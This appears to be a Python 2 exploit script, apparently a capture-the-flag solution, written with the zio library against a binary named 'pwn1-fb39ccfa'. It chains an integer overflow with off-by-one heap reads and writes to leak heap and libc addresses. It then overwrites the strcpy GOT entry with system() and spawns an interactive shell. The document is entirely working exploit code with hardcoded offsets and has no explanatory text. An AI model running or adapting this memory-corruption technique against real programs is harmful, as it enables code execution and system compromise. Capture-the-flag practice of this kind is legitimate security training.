from zio import *
import ctypes

target  = './pwn1-fb39ccfa'
io      = zio(target, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'blue'), timeout = 1000)
io.gdb_hint([0x804959f]) 

io.read_until('_CMD_$')
io.writelines(['sort', '1', str(0x40000000)])   # 0x40000000 << 2 + 1 = 0x4 (integer overflow !

io.writeline('3')                               # sort
io.writelines(['1', '1'])                       # off-by-one leak
io.read_until('[*L*] Query result: ')
heap_base = int(io.read_line()[0:-1]) - 0x38
print '[+] heap base : ' + hex(heap_base)

io.writelines(['2', '1'])                       # off-by-one write
io.writeline(str(heap_base + 0x3c))
io.read_until('Choose:')
io.writeline('7')

io.read_until('_CMD_$')
io.writelines(['reload', '0'])


got_strcpy  = 0x0804d03c
idx  = str((got_strcpy + 0x100000000 - (heap_base + 0x4c)) / 4)
io.writelines(['1', idx])
io.read_until('[*L*] Query result: ')

off_strcpy  = 0x00139ad0                        # 
adr_strcpy  = ctypes.c_uint32(int(io.read_line()[0:-1])).value
print '[+] strcpy\t: ' + hex(adr_strcpy)
libc_base   = adr_strcpy - off_strcpy
print '[+] libc base\t: ' + hex(libc_base)
off_system  = 0x00040190                        # 0x0003bc90
adr_system  = libc_base + off_system
print '[+] system\t: ' + hex(adr_system)

val  = str(ctypes.c_int32(adr_system).value)
io.read_until('Choose:')
io.writelines(['2', idx, val])
io.writeline('7')

io.read_until('_CMD_$')
io.writeline('sh')

io.interact()
